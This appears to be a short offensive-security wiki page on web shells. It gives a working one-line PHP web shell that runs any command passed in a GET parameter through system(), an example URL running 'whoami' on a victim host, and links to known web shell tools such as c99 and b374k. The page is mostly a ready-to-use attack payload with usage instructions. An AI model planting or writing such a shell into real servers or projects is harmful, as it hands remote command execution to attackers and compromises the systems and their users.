---
description: >-
  Script written in language supported by a compromised web server whuch
  executes commands through the web server itself
---

# Web Shells

Example of php web shell

```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```

If you managed to have this inside of a php file on the server for example named `shell.php` you can later use:

```
http://victim.com/uploads/shell.php?cmd=whoami
```

### Available Web shells

* [p0wny-shell](https://github.com/flozz/p0wny-shell) - A minimalistic single-file PHP web shell that allows remote command execution.
* [b374k shell](https://github.com/b374k/b374k) - A more feature-rich PHP web shell with file management and command execution, among other functionalities
* [c99 shell](https://www.r57shell.net/single.php?id=13) - A well-known and robust PHP web shell with extensive functionality.
